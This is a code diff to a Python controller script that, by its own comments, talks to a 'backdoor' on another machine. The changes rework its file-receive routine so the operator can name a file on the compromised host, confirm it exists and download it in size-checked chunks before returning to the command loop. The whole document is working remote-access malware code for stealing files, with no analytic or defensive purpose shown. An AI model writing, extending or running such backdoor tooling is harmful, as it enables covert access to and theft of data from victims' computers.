@@ -1,11 +1,5 @@
 import socket
 
-
-
-
-
-#Test Push
-
 def handle_command(client_socket):
     while True:
         # Receive commands from the user
@@ -31,20 +25,27 @@ def receive_file(client_socket):
     filename = input("Input the Filename: ")
     client_socket.send(filename.encode('utf-8'))
 
-    msg = client_socket.recv(1024)
+    msg = client_socket.recv(1024) #Receive the message from the backdoor to check the file exist or not
     if msg.decode('utf-8') == "File not found":
         print(msg)
         handle_command(client_socket)
-    else:
+
+    elif msg.decode('utf-8') == "File exists": #If the file exists start download
+        print(msg)
+        file_size = int(client_socket.recv(1024).decode('utf-8'))
+        bytes_received = 0
+
         with open(filename, 'wb') as file:  # Open the file to save it locally
-            while True:
+            while bytes_received < file_size:
                chunk = client_socket.recv(1024)
 
-               if not chunk:
-                   break
-
                file.write(chunk)
-        print("File Downloaded!")
+
+               bytes_received += len(chunk)
+               print(f"Received {bytes_received}/{file_size} bytes")
+
+        print(f"File {filename} received successfully. Total bytes received: {bytes_received}")
+        handle_command(client_socket)
 
 
 
